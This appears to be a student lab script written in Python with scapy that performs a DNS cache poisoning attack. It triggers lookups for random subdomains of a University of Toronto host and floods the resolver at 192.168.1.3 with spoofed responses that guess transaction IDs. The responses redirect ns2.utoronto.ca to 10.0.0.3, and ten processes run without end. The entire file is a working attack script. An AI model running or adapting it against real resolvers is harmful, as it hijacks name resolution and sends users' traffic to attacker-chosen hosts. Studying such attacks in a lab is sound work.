from scapy.all import *
from random import randint
import subprocess
from multiprocessing import Process
import string

from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP


def generate_word():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(10))


def guesser_and_checker():
    ip_layer = IP(src='', dst='192.168.1.3')
    udp_layer = UDP(dport=53, chksum=None)
    dns_layer = DNS(qr=1, id=randint(0, 65535))  # found that max through trial and error :(
    dnsrr_layer = DNSRR(rrname='ns2.utoronto.ca', rdata='10.0.0.3')

    packet = ip_layer / udp_layer / dns_layer / dnsrr_layer

    url = 'cms-weblab.utsc.utoronto.ca'

    while True:
        subprocess.call(f'dig {generate_word()}.{url} &', shell=True)
        send(packet, count=50)
        dns_layer.id = randint(0, 65535)


processes = [Process(target=guesser_and_checker).start() for i in range(10)]
